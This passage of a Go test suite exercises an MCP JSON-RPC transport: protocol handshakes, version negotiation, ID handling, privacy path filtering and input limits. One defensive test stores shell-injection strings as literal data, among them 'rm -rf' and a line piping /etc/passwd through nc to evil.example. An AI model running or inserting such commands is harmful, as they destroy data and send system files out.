		"task":        "summarize local MCP transport round-trip",
		"harness":     "codex",
		"cwd":         t.TempDir(),
		"repo_kind":   "control-plane",
		"mode":        "execute",
		"body_budget": 0,
	}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 500, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 500)
	if env["error"] != nil {
		t.Fatalf("orient_recall returned JSON-RPC error: %+v", env["error"])
	}
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("orient_recall isError=true: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	if got, _ := ack["schema"].(string); got != mcpOrientAckSchema {
		t.Fatalf("schema = %v, want %q", got, mcpOrientAckSchema)
	}
	packID, _ := ack["pack_id"].(string)
	contractID, _ := ack["contract_id"].(string)
	if !strings.HasPrefix(packID, "ctx_") || !strings.HasPrefix(contractID, "contract_") {
		t.Fatalf("pack_id=%q contract_id=%q, want ctx_/contract_ prefixes", packID, contractID)
	}
	if got, _ := ack["body_pack_present"].(bool); got {
		t.Fatalf("body_pack_present = true, want false (body_budget=0)")
	}
	decs, _ := ack["active_decisions"].([]interface{})
	if len(decs) == 0 {
		t.Fatalf("active_decisions empty: %+v", ack)
	}
	mems, _ := ack["active_memory"].([]interface{})
	if len(mems) == 0 {
		t.Fatalf("active_memory empty: %+v", ack)
	}

	persisted, _ := ack["persisted_artifacts"].(map[string]interface{})
	if persisted == nil {
		t.Fatalf("missing persisted_artifacts: %+v", ack)
	}
	ecPath, _ := persisted["effective_contract_path"].(string)
	latestPath, _ := persisted["latest_contract_path"].(string)
	packPath, _ := persisted["context_pack_path"].(string)
	for name, p := range map[string]string{"effective": ecPath, "latest": latestPath, "pack": packPath} {
		if p == "" {
			t.Fatalf("persisted.%s_path empty", name)
		}
		if filepath.IsAbs(p) {
			t.Fatalf("persisted.%s_path is absolute: %s", name, p)
		}
		if _, err := os.Stat(filepath.Join(homePath, filepath.FromSlash(p))); err != nil {
			t.Fatalf("persisted %s artifact missing on disk: %v\npath=%s", name, err, p)
		}
	}
	// Persisted artifact refs are home-relative and contain no private temp path.
	for _, p := range []string{ecPath, latestPath, packPath} {
		if strings.Contains(p, filepath.ToSlash(homePath)) || strings.HasPrefix(p, "../") {
			t.Fatalf("persisted artifact ref is not safely home-relative: %s", p)
		}
	}
}

func TestMCPTransportOrientRecallRejectsUnknownArgumentField(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"task": "x", "rogue_field": "z"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 501, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 501)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("unknown arg field must be rejected, got %+v", res)
	}
}

func TestMCPTransportOrientRecallStaysWithinUninitializedHome(t *testing.T) {
	homePath := t.TempDir()
	// Point COMPOUND_HOME at an EMPTY tempdir and intentionally do NOT call
	// home.Init. The transport must NOT silently fall back to ~/.compound
	// (the global default in home.Resolve): every artifact it writes must
	// live under homePath. orient_recall may either succeed (the orient
	// materializer is willing to project onto an empty home) OR fail closed;
	// it must NEVER leak into the real COMPOUND_HOME.
	t.Setenv("COMPOUND_HOME", homePath)
	args := map[string]any{"task": "x"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 502, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 502)
	if res, ok := env["result"].(map[string]interface{}); ok {
		if isErr, _ := res["isError"].(bool); !isErr {
			ack := decodeMCPStructuredContent(t, res)
			persisted := ack["persisted_artifacts"].(map[string]interface{})
			for _, key := range []string{"effective_contract_path", "latest_contract_path", "context_pack_path"} {
				ref, _ := persisted[key].(string)
				if ref == "" || filepath.IsAbs(ref) || strings.Contains(ref, homePath) {
					t.Fatalf("persisted artifact %s is not home-relative: %q", key, ref)
				}
				if _, err := os.Stat(filepath.Join(homePath, filepath.FromSlash(ref))); err != nil {
					t.Fatalf("persisted artifact %s is not in selected temp home: %v", key, err)
				}
			}
		}
	}
}

func TestMCPTransportOrientRecallClampsRecallRefsToBoundedCap(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })

	// Build an over-cap set of recall refs.
	oversizedDecisions := make([]string, 0, mcpMaxRecallRefs+10)
	oversizedMemory := make([]string, 0, mcpMaxRecallRefs+10)
	for i := 0; i < mcpMaxRecallRefs+10; i++ {
		oversizedDecisions = append(oversizedDecisions, fmt.Sprintf("decision_%03d", i))
		oversizedMemory = append(oversizedMemory, fmt.Sprintf("memory_%03d", i))
	}
	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		pack.ActiveDecisions = oversizedDecisions
		pack.ActiveMemory = oversizedMemory
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	materializeBodiesForOrient = func(string, envelope.ContextPack, string, string, int) (envelope.ContextPack, error) {
		return envelope.ContextPack{}, nil
	}
	args := map[string]any{"task": "clamp recall"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 503, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 503)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("orient_recall refused oversized refs: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	decs := ack["active_decisions"].([]interface{})
	mems := ack["active_memory"].([]interface{})
	if len(decs) != mcpMaxRecallRefs {
		t.Fatalf("active_decisions count = %d, want %d", len(decs), mcpMaxRecallRefs)
	}
	if len(mems) != mcpMaxRecallRefs {
		t.Fatalf("active_memory count = %d, want %d", len(mems), mcpMaxRecallRefs)
	}
}

// ---------- tools/call · dispatch ----------

func TestMCPTransportUnknownToolReturnsToolUnavailable(t *testing.T) {
	homePath := initMCPTestHome(t)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 600, "method": "tools/call",
		"params": map[string]any{"name": "compound_bogus_tool"},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 600)
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcToolUnavailable) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcToolUnavailable)
	}
}

func TestMCPTransportModern_UnknownToolReturns32602NotLegacyCode(t *testing.T) {
	homePath := initMCPTestHome(t)
	modernRequest := map[string]any{
		"jsonrpc": "2.0",
		"id":      "modern-unknown",
		"method":  "tools/call",
		"params": map[string]any{
			"name":  "nope",
			"_meta": modernMeta(mcpTestModernProtocolVersion),
		},
	}
	modernError := rawResp(t, runModernMCPTransport(t, nil, []string{string(mustJSON(t, modernRequest))}, homePath), "modern-unknown")["error"].(map[string]interface{})
	if modernError["code"] != float64(rpcInvalidParams) {
		t.Fatalf("modern unknown tool code = %v, want %d", modernError["code"], rpcInvalidParams)
	}

	legacyRequest := map[string]any{
		"jsonrpc": "2.0",
		"id":      "legacy-unknown",
		"method":  "tools/call",
		"params":  map[string]any{"name": "nope"},
	}
	legacyError := rawResp(t, runReadyMCPTransport(t, nil, []string{string(mustJSON(t, legacyRequest))}, homePath), "legacy-unknown")["error"].(map[string]interface{})
	if legacyError["code"] != float64(rpcToolUnavailable) {
		t.Fatalf("legacy unknown tool code = %v, want %d", legacyError["code"], rpcToolUnavailable)
	}
}

func TestMCPTransportModern_WorksAfterLegacyHandshakeAndViceVersa(t *testing.T) {
	homePath := initMCPTestHome(t)
	modernList := map[string]any{
		"jsonrpc": "2.0",
		"id":      "modern-before-initialize",
		"method":  "tools/list",
		"params":  map[string]any{"_meta": modernMeta(mcpTestModernProtocolVersion)},
	}
	modernCall := map[string]any{
		"jsonrpc": "2.0",
		"id":      "modern-after-initialize",
		"method":  "tools/call",
		"params": map[string]any{
			"name":      mcpFindingToolName,
			"arguments": map[string]any{"topic": "mixed-era", "body": "mixed-era body"},
			"_meta":     modernMeta(mcpTestModernProtocolVersion),
		},
	}
	modernCancelled := map[string]any{
		"jsonrpc": "2.0",
		"method":  "notifications/cancelled",
		"params":  map[string]any{"_meta": modernMeta(mcpTestModernProtocolVersion)},
	}
	lines := runMCPTransport(t, nil, []string{
		string(mustJSON(t, modernList)),
		`{"jsonrpc":"2.0","id":"legacy-initialize","method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"mixed-era-test","version":"1"}}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":"legacy-after-initialize","method":"tools/list"}`,
		string(mustJSON(t, modernCall)),
		string(mustJSON(t, modernCancelled)),
	}, homePath)
	if len(lines) != 4 {
		t.Fatalf("mixed-era responses = %d, want four requests and no notification response: %v", len(lines), lines)
	}
	modernListResult := rawResp(t, lines, "modern-before-initialize")["result"].(map[string]interface{})
	if modernListResult["resultType"] != "complete" {
		t.Fatalf("pre-initialize modern list failed: %+v", modernListResult)
	}
	legacyInitializeResult := rawResp(t, lines, "legacy-initialize")["result"].(map[string]interface{})
	if legacyInitializeResult["protocolVersion"] != mcpProtocolVersion {
		t.Fatalf("legacy initialize after modern request failed: %+v", legacyInitializeResult)
	}
	if _, modernField := legacyInitializeResult["resultType"]; modernField {
		t.Fatalf("legacy initialize gained modern resultType: %+v", legacyInitializeResult)
	}
	legacyListResult := rawResp(t, lines, "legacy-after-initialize")["result"].(map[string]interface{})
	if _, modernField := legacyListResult["resultType"]; modernField {
		t.Fatalf("legacy list gained modern resultType: %+v", legacyListResult)
	}
	modernCallEnvelope := rawResp(t, lines, "modern-after-initialize")
	modernCallResult, ok := modernCallEnvelope["result"].(map[string]interface{})
	if !ok {
		t.Fatalf("post-initialize modern call returned no result: %+v", modernCallEnvelope)
	}
	if modernCallResult["resultType"] != "complete" || modernCallResult["isError"] != false {
		t.Fatalf("post-initialize modern call failed: %+v", modernCallResult)
	}
	assertMCPModernServerInfo(t, modernCallResult)
}

func TestMCPTransportModernLegacy_ResponsesCarryNoModernFields(t *testing.T) {
	homePath := initMCPTestHome(t)
	lines := runMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":"legacy-initialize","method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"legacy-shape-test","version":"1"}}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":"legacy-list","method":"tools/list"}`,
		`{"jsonrpc":"2.0","id":"legacy-call","method":"tools/call","params":{"name":"compound_finding_record","arguments":{"topic":"legacy-shape","body":"legacy-shape body"}}}`,
	}, homePath)
	for _, id := range []string{"legacy-initialize", "legacy-list", "legacy-call"} {
		result, ok := rawResp(t, lines, id)["result"].(map[string]interface{})
		if !ok {
			t.Fatalf("%s missing result", id)
		}
		for _, modernField := range []string{"resultType", "ttlMs", "cacheScope", "_meta"} {
			if _, present := result[modernField]; present {
				t.Fatalf("%s legacy result gained modern field %q: %+v", id, modernField, result)
			}
		}
	}
}

func TestMCPTransportToolCallMissingArgsReturnsToolError(t *testing.T) {
	homePath := initMCPTestHome(t)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 601, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 601)
	if env["error"] != nil {
		t.Fatalf("missing arguments must NOT surface JSON-RPC error envelope, got %+v", env)
	}
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("missing arguments must surface tool-level isError=true, got %+v", res)
	}
}

// ---------- Privacy / safety matrices ----------

func TestMCPTransportFindingRecordTreatsShellMetacharsAsLiteralTopicBody(t *testing.T) {
	homePath := initMCPTestHome(t)
	// A topic that LOOKS like a shell injection attempt. The transport must
	// store it as a literal finding body, NEVER spawn a shell.
	topic := "mcp shell-injection probe $(rm -rf /tmp/x); echo pwn"
	body := "host: ; cat /etc/passwd | nc evil.example 8080\nline2\n`uname -a`"
	args := map[string]any{"topic": topic, "body": body}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 700, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 700)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("shell-metachar payload must be stored as literal finding: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	id, _ := ack["id"].(string)
	recPath := filepath.Join(homePath, finding.Subdir, id+".json")
	raw, err := os.ReadFile(recPath)
	if err != nil {
		t.Fatalf("read recorded finding: %v", err)
	}
	var rec finding.Finding
	if err := json.Unmarshal(raw, &rec); err != nil {
		t.Fatalf("parse recorded finding: %v", err)
	}
	if rec.Topic != topic || rec.Body != body {
		t.Fatalf("topic/body altered by transport: topic=%q body=%q", rec.Topic, rec.Body)
	}
}

func TestMCPTransportOrientRecallNeverAutoPromotes(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })

	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	materializeBodiesForOrient = func(string, envelope.ContextPack, string, string, int) (envelope.ContextPack, error) {
		return envelope.ContextPack{}, nil
	}
	// Snapshot home contents BEFORE orient_recall runs. The transport must NOT
	// create any promotion-side artifact (no candidate promoted, no ledger
	// mutation). Then snapshot AFTER and diff the two. We allowlisted the
	// runtime materialization outputs (one EffectiveContract in
	// contracts/effective/YYYY-MM-DD/, one context/packs/ ctx_*.json, plus the
	// latest.json pointer) and the events/ retrieval-traffic line which the
	// orient materializer already writes as a non-promotion side-effect.
	before := mustDirSnapshot(t, homePath)
	args := map[string]any{"task": "promote-probe"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 800, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 800)
	if isErr, _ := env["result"].(map[string]interface{})["isError"].(bool); isErr {
		t.Fatalf("orient_recall refused: %+v", env)
	}
	after := mustDirSnapshot(t, homePath)
	// Forbidden side-effects: orient_recall MUST NOT promote any candidate or
	// touch the ledger. New files in those surfaces are a contract violation.
	forbiddenSubstrings := []string{
		"/candidates/",       // candidate promotion surface
		"/ledger/",           // ledger byte mutation surface
		"/observed/claims/",  // any promoted-claim home
		"/decisions/",        // operator-ruling surface
		"/runtime/work_",     // work envelope promotion
		"/works/",            // work side-effect
		"/memory/canonical/", // promotion to canonical memory
	}
	for path := range after {
		if before[path] {
			continue
		}
		ps := filepath.ToSlash(path)
		for _, forbidden := range forbiddenSubstrings {
			if strings.Contains(ps, forbidden) {
				t.Fatalf("orient_recall wrote to a promotion-side surface %q (matched %q)", path, forbidden)
			}
		}
	}
	// additionally: every claim/candidate byte within /observed/claims or
	// /candidates MUST be byte-identical to its pre-call snapshot. (We skip
	// this when those dirs are absent.)
	for _, dir := range []string{"observed/claims", "candidates", "ledger"} {
		full := filepath.Join(homePath, dir)
		if _, err := os.Stat(full); errors.Is(err, os.ErrNotExist) {
			continue
		}
		// any file inside is a problem — they shouldn't exist after a single
		// orient_recall call.
		_ = filepath.WalkDir(full, func(p string, d os.DirEntry, err error) error {
			if err != nil || d.IsDir() {
				return err
			}
			t.Fatalf("orient_recall authored file in %q: %s", dir, p)
			return nil
		})
	}
}

func mustDirSnapshot(t *testing.T, root string) map[string]bool {
	t.Helper()
	out := map[string]bool{}
	err := filepath.WalkDir(root, func(p string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		out[p] = true
		return nil
	})
	if err != nil {
		t.Fatalf("walkdir: %v", err)
	}
	return out
}

func TestMCPTransportFindingRecordRejectsEvidenceOverCap(t *testing.T) {
	homePath := initMCPTestHome(t)
	oversized := make([]string, 0, mcpMaxEvidenceRefs+1)
	for i := 0; i < mcpMaxEvidenceRefs+1; i++ {
		oversized = append(oversized, fmt.Sprintf("sha256:%064d", i))
	}
	args := map[string]any{"topic": "ev", "body": "x", "evidence_refs": oversized}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 900, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 900)
	if isErr, _ := env["result"].(map[string]interface{})["isError"].(bool); !isErr {
		t.Fatalf("oversized evidence_refs must be rejected, got %+v", env)
	}
}

func TestMCPTransportLifecycleRequiresInitializeThenInitialized(t *testing.T) {
	homePath := initMCPTestHome(t)
	lines := runMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`,
		`{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"compound_finding_record","arguments":{"topic":"blocked","body":"blocked"}}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":2,"method":"tools/list"}`,
		`{"jsonrpc":"2.0","id":3,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1"}}}`,
		`{"jsonrpc":"2.0","id":null,"method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":4,"method":"tools/list"}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":5,"method":"tools/list"}`,
	}, homePath)
	for _, id := range []int{1, 2, 4, 6} {
		errObj := rawResp(t, lines, id)["error"].(map[string]interface{})
		if errObj["code"] != float64(rpcServerNotInitialized) {
			t.Fatalf("id %d code = %v, want %d", id, errObj["code"], rpcServerNotInitialized)
		}
	}
	if code := rawResp(t, lines, nil)["error"].(map[string]interface{})["code"]; code != float64(rpcMethodNotFound) {
		t.Fatalf("id:null initialized request code = %v, want %d", code, rpcMethodNotFound)
	}
	if _, ok := rawResp(t, lines, 3)["result"]; !ok {
		t.Fatalf("initialize did not succeed: %+v", rawResp(t, lines, 3))
	}
	if entries, err := os.ReadDir(filepath.Join(homePath, finding.Subdir)); err == nil && len(entries) != 0 {
		t.Fatalf("pre-initialize tools/call wrote finding state: %v", entries)
	} else if err != nil && !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("read findings after blocked call: %v", err)
	}
	if _, ok := rawResp(t, lines, 5)["result"]; !ok {
		t.Fatalf("tools/list did not become ready: %+v", rawResp(t, lines, 5))
	}
}

func TestMCPTransportInitializeNegotiatesOnlyCompatibleVersions(t *testing.T) {
	for _, version := range []string{mcpLegacyProtocolVersion, mcpProtocolVersion} {
		t.Run(version, func(t *testing.T) {
			homePath := initMCPTestHome(t)
			req := fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":%q,"capabilities":{},"clientInfo":{"name":"probe","version":"1"}}}`, version)
			res := rawResp(t, runMCPTransport(t, nil, []string{req}, homePath), 1)["result"].(map[string]interface{})
			if res["protocolVersion"] != version {
				t.Fatalf("negotiated version = %v, want %q", res["protocolVersion"], version)
			}
		})
	}

	homePath := initMCPTestHome(t)
	lines := runMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":10,"method":"initialize","params":{"protocolVersion":"2099-01-01","capabilities":{},"clientInfo":{"name":"probe","version":"1"}}}`,
	}, homePath)
	res := rawResp(t, lines, 10)["result"].(map[string]interface{})
	if got := res["protocolVersion"]; got != mcpProtocolVersion {
		t.Fatalf("unsupported client version negotiated %v, want latest supported %q", got, mcpProtocolVersion)
	}
}

func TestMCPTransportInitializeRequiresTypedParams(t *testing.T) {
	homePath := initMCPTestHome(t)
	for i, params := range []string{
		`{"protocolVersion":"2025-06-18","clientInfo":{"name":"probe","version":"1"}}`,
		`{"protocolVersion":"2025-06-18","capabilities":[],"clientInfo":{"name":"probe","version":"1"}}`,
		`{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"","version":"1"}}`,
		`{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1"},"_meta":[]}`,
		`{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1","title":"` + strings.Repeat("t", mcpMaxClientTitleChars+1) + `"}}`,
		`{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1"},"unknown":true}`,
	} {
		req := fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":"initialize","params":%s}`, i+1, params)
		code := rawResp(t, runMCPTransport(t, nil, []string{req}, homePath), i+1)["error"].(map[string]interface{})["code"]
		if code != float64(rpcInvalidParams) {
			t.Fatalf("case %d code = %v, want %d", i, code, rpcInvalidParams)
		}
	}
}

func TestMCPTransportPreservesNullLargeAndStringIDsExactly(t *testing.T) {
	homePath := initMCPTestHome(t)
	large := "900719925474099312345678901234567890"
	escaped := `"\u0063lient-id"`
	lines := runMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":null,"method":"ping"}`,
		`{"jsonrpc":"2.0","id":` + large + `,"method":"ping"}`,
		`{"jsonrpc":"2.0","id":` + escaped + `,"method":"ping"}`,
		`{"jsonrpc":"2.0","method":"ping"}`,
	}, homePath)
	if len(lines) != 3 {
		t.Fatalf("responses = %d, want explicit-null/large/string only: %v", len(lines), lines)
	}
	wants := []string{
		`{"jsonrpc":"2.0","id":null,"result":{}}`,
		`{"jsonrpc":"2.0","id":` + large + `,"result":{}}`,
		`{"jsonrpc":"2.0","id":` + escaped + `,"result":{}}`,
	}
	for i, want := range wants {
		if lines[i] != want {
			t.Fatalf("response %d = %q, want exact %q", i, lines[i], want)
		}
	}
}

func TestMCPTransportRejectsStructuredAndBooleanIDsExactly(t *testing.T) {
	homePath := initMCPTestHome(t)
	lines := runMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":{},"method":"ping"}`,
		`{"jsonrpc":"2.0","id":[],"method":"ping"}`,
		`{"jsonrpc":"2.0","id":true,"method":"ping"}`,
		`{"jsonrpc":"2.0","id":false,"method":"ping"}`,
	}, homePath)
	want := `{"jsonrpc":"2.0","id":null,"error":{"code":-32600,"message":"invalid request"}}`
	if len(lines) != 4 {
		t.Fatalf("responses = %d, want 4: %v", len(lines), lines)
	}
	for i, line := range lines {
		if line != want {
			t.Fatalf("response %d = %q, want exact %q", i, line, want)
		}
	}
}

func TestMCPTransportPrivacyFilterEmbeddedLocalPaths(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
		want  string
	}{
		{name: "bare", input: "artifact /private/file.txt ready", want: "artifact [private-path] ready"},
		{name: "assignment", input: "path=/private/file.txt", want: "path=[private-path]"},
		{name: "markdown", input: "[artifact](/private/file.txt)", want: "[artifact]([private-path])"},
		{name: "markdown angle space", input: "[artifact](</private/My File.txt>)", want: "[artifact](<[private-path]>)"},
		{name: "markdown balanced parentheses", input: "[artifact](/private/file(name).txt)", want: "[artifact]([private-path])"},
		{name: "double quoted assignment space", input: `path="/private/My File.txt"`, want: `path="[private-path]"`},
		{name: "single quoted assignment space", input: `path='/private/My File.txt'`, want: `path='[private-path]'`},
		{name: "truncated quote fails closed", input: `path="/private/My File.txt`, want: `path="[private-path]`},
		{name: "truncated angle fails closed", input: `[artifact](</private/My File.txt`, want: `[artifact](<[private-path]`},
		{name: "file uri", input: "uri=file:///private/My%20File.txt", want: "uri=[private-path]"},
		{name: "windows", input: `path=C:\Users\synthetic\file.txt`, want: "path=[private-path]"},
		{name: "quoted windows space", input: `path="C:\Users\synthetic name\file.txt"`, want: `path="[private-path]"`},
		{name: "unc", input: `path=\\synthetic\share\file.txt`, want: "path=[private-path]"},
		{name: "named home shorthand", input: "path=~synthetic/private/file.txt", want: "path=[private-path]"},
		{name: "markdown table boundary", input: "|/private/My File.txt|", want: "|[private-path]|"},
		{name: "markdown blockquote boundary", input: ">/private/file.txt", want: ">[private-path]"},
		{name: "https unchanged", input: "url=https://example.invalid/private/file.txt", want: "url=https://example.invalid/private/file.txt"},
		{name: "protocol relative url unchanged", input: "url=//cdn.example.invalid/private/file.txt", want: "url=//cdn.example.invalid/private/file.txt"},
		{name: "file prose unchanged", input: "file: attached", want: "file: attached"},
		{name: "mime unchanged", input: "format=text/plain", want: "format=text/plain"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := privacyFilterMCPString(tc.input); got != tc.want {
				t.Fatalf("privacyFilterMCPString(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestMCPTransportToolResultShapeMatchesAdvertisedCapabilities(t *testing.T) {
	for _, version := range []string{mcpLegacyProtocolVersion, mcpProtocolVersion} {
		t.Run(version, func(t *testing.T) {
			homePath := initMCPTestHome(t)
			lines := runMCPTransport(t, nil, []string{
				fmt.Sprintf(`{"jsonrpc":"2.0","id":"init","method":"initialize","params":{"protocolVersion":%q,"capabilities":{},"clientInfo":{"name":"shape-test","version":"1"}}}`, version),
				`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
				`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`,
				`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"compound_finding_record","arguments":{"topic":"shape","body":"shape body"}}}`,
			}, homePath)
			tools := rawResp(t, lines, 1)["result"].(map[string]interface{})["tools"].([]interface{})
			for _, raw := range tools {
				if _, advertised := raw.(map[string]interface{})["outputSchema"]; advertised {
					t.Fatalf("tool advertises outputSchema without structured output: %+v", raw)
				}
			}
			result := rawResp(t, lines, 2)["result"].(map[string]interface{})
			decodeMCPStructuredContent(t, result)
		})
	}
}

func TestMCPTransportFindingSchemaAndRuntimeBoundariesMatch(t *testing.T) {
	homePath := initMCPTestHome(t)
	properties := mcpFindingRecordDescriptor().InputSchema["properties"].(map[string]interface{})
	checks := map[string]int{
		"topic": mcpMaxFindingTopicChars, "body": mcpMaxFindingBodyChars,
		"work_id": mcpMaxFindingWorkIDChars, "produced_by": mcpMaxFindingProducerChars,
		"supersedes": mcpMaxFindingSupersedesChars,
	}
	for field, want := range checks {
		schema := properties[field].(map[string]interface{})
		if got := schema["maxLength"]; got != want {
			t.Fatalf("schema %s maxLength = %v, want %d", field, got, want)
		}
	}
	items := properties["evidence_refs"].(map[string]interface{})["items"].(map[string]interface{})
	if got := items["maxLength"]; got != mcpMaxEvidenceRefChars {
		t.Fatalf("evidence ref maxLength = %v, want %d", got, mcpMaxEvidenceRefChars)
	}
	bodySchema := properties["body"].(map[string]interface{})
	if got := bodySchema["x-maxBytes"]; got != mcpMaxFindingBodyBytes {
		t.Fatalf("body x-maxBytes = %v, want %d", got, mcpMaxFindingBodyBytes)
	}

	refsAtLimit := make([]string, mcpMaxEvidenceRefs)
	for i := range refsAtLimit {
		refsAtLimit[i] = fmt.Sprintf("git:%d", i)
	}
	valid := []map[string]any{
		{"topic": strings.Repeat("t", mcpMaxFindingTopicChars), "body": "topic boundary"},
		{"topic": strings.Repeat("é", mcpMaxFindingTopicChars), "body": "multibyte topic boundary"},
		{"topic": "body-boundary", "body": strings.Repeat("b", mcpMaxFindingBodyChars)},
		{"topic": "work-boundary", "body": "x", "work_id": "work_" + strings.Repeat("w", mcpMaxFindingWorkIDChars-5)},
		{"topic": "producer-boundary", "body": "x", "produced_by": "p" + strings.Repeat("a", mcpMaxFindingProducerChars-1)},
		{"topic": "supersedes-boundary", "body": "x", "supersedes": "find_0123456789ab"},
		{"topic": "evidence-boundary", "body": "x", "evidence_refs": []string{"git:" + strings.Repeat("a", mcpMaxEvidenceRefChars-4)}},
		{"topic": "evidence-count-boundary", "body": "x", "evidence_refs": refsAtLimit},
	}
	for i, args := range valid {
		result := mcpFindingResultMap(t, mcpCallFindingRecord(mustJSON(t, args)))
		if isErr, _ := result["isError"].(bool); isErr {
			t.Fatalf("valid boundary %d rejected: %+v", i, result)
		}
	}

	byteBoundedBody := strings.Repeat("é", mcpMaxFindingBodyBytes/2+1)
